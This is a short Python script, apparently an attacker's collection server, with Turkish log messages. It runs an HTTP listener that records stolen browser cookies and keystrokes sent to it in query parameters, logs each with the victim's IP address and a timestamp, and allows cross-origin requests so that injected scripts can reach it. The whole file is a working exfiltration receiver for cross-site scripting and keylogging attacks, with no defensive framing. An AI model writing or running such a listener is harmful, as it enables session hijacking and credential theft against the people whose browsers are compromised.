import http.server
import socketserver
import urllib.parse
from datetime import datetime

PORT = 8000
LOG_FILE = "captured_data.txt"

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        captured_info = ""
        
        if 'c' in query_params:
            captured_info = f"[+] COOKIE YAKALANDI: {query_params['c'][0]}"
        elif 'k' in query_params:
            captured_info = f"[+] TUŞ YAKALANDI: {query_params['k'][0]}"
            
        if captured_info:
            log_message = f"[{timestamp}] {self.client_address[0]} -> {captured_info}"
            print(f"\033[92m{log_message}\033[0m")
            with open(LOG_FILE, "a") as f: f.write(log_message + "\n")
        
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

if __name__ == "__main__":
    print(f"[*] LISTENER BAŞLATILDI (Port: {PORT})")
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        try: httpd.serve_forever()
        except KeyboardInterrupt: pass